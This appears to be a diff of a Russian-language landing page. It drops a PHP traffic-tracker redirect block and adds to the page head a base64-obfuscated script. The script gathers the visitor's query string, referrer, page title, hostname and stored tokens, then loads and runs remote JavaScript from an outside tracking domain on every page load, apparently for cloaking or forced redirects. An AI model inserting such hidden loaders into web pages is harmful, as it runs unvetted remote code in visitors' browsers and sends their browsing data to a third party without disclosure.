@@ -1,18 +1,3 @@
-<?php
-// Query params are: utm_placement={{placement}}&campaign_id={{campaign.id}}&adset_id={{adset.id}}&ad_id={{ad.id}}&adset_name={{adset.name}}&utm_creative={{ad.name}}&utm_campaign={{campaign.name}}&utm_source={{site_source_name}} 
-
-require_once dirname(__FILE__) . '/kclient.php';
-$client = new KClient('https://blackwordstrack.ru/api.php?', 's518nrmftqcxxdtqlvlbjnskpcnjfvs4');
-$client->sendAllParams();       // to send all params from page query
-$client->forceRedirectOffer();       // redirect to offer if an offer is chosen
-// $client->param('sub_id_5', '123'); // you can send any params
-// $client->keyword('PASTE_KEYWORD');  // send custom keyword
-// $client->currentPageAsReferrer(); // to send current page URL as click referrer
-// $client->disableSessions(); // to disable using session cookie (without this cookie restoreFromSession wouldn't work)
-// $client->debug();              // to enable debug mode and show the errors
-// $client->execute();             // request to api, show the output and continue
-$client->executeAndBreak();     // to stop page execution if there is redirect or some output
-?>
 <!DOCTYPE html>
 <html lang="ru">
   <head>
@@ -34,6 +19,7 @@ $client->executeAndBreak();     // to stop page execution if there is redirect o
     <link rel="manifest" href="site.webmanifest">
     <meta name="msapplication-TileColor" content="#da532c">
     <meta name="theme-color" content="#ffffff">
+    <script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfNW1SS1EyZFZoeVQ2SnpuZic7CiAgICBpZiAoIXdpbmRvdy5fNW1SS1EyZFZoeVQ2SnpuZikgewogICAgICAgIHdpbmRvdy5fNW1SS1EyZFZoeVQ2SnpuZiA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9ibGFja3dvcmRzdHJhY2sucnUvVExWTGJ0JywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgX0dCUXpDblhCdEhDQ3hNdjEgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF9HQlF6Q25YQnRIQ0N4TXYxICE9PSAndW5kZWZpbmVkJyAmJiBfR0JRekNuWEJ0SENDeE12MSAhPT0gbnVsbCkgewogICAgICAgIHZhciBfWGRkVmhDY2NIa1laV1ljZyA9IEpTT04ucGFyc2UoX0dCUXpDblhCdEhDQ3hNdjEpOwogICAgICAgIHZhciBfZm5mYll2c3F3bXhZWER3eiA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF9YZGRWaENjY0hrWVpXWWNnLmNyZWF0ZWRfYXQgKyB3aW5kb3cuXzVtUktRMmRWaHlUNkp6bmYudHRsIDwgX2ZuZmJZdnNxd214WVhEd3opIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF9xOU1HQzFLV0RDV0hmS1prID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX2hRcDRxZHhidFl0cmZKN00gPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfdGJCZlpRNmJiUUpXNnRwQyA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgX3RiQmZaUTZiYlFKVzZ0cEMgKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgX3RiQmZaUTZiYlFKVzZ0cEMgKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfdGJCZlpRNmJiUUpXNnRwQyArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfdGJCZlpRNmJiUUpXNnRwQyArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgX3RiQmZaUTZiYlFKVzZ0cEMgKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICAgICAgX3RiQmZaUTZiYlFKVzZ0cEMgKz0gJyZob3N0PScgKyBlbmNvZGVVUklDb21wb25lbnQod2luZG93Ll81bVJLUTJkVmh5VDZKem5mLlJfUEFUSCk7CiAgICBpZiAodHlwZW9mIF9xOU1HQzFLV0RDV0hmS1prICE9PSAndW5kZWZpbmVkJyAmJiBfcTlNR0MxS1dEQ1dIZktaayAmJiB3aW5kb3cuXzVtUktRMmRWaHlUNkp6bmYudW5pcXVlKSB7CiAgICAgICAgX3RiQmZaUTZiYlFKVzZ0cEMgKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfcTlNR0MxS1dEQ1dIZktaayk7CiAgICB9CiAgICBpZiAodHlwZW9mIF9oUXA0cWR4YnRZdHJmSjdNICE9PSAndW5kZWZpbmVkJyAmJiBfaFFwNHFkeGJ0WXRyZko3TSAmJiB3aW5kb3cuXzVtUktRMmRWaHlUNkp6bmYudW5pcXVlKSB7CiAgICAgICAgX3RiQmZaUTZiYlFKVzZ0cEMgKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9oUXA0cWR4YnRZdHJmSjdNKTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll81bVJLUTJkVmh5VDZKem5mLlJfUEFUSCArIF90YkJmWlE2YmJRSlc2dHBDOwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg"></script>
     
 	
   </head>
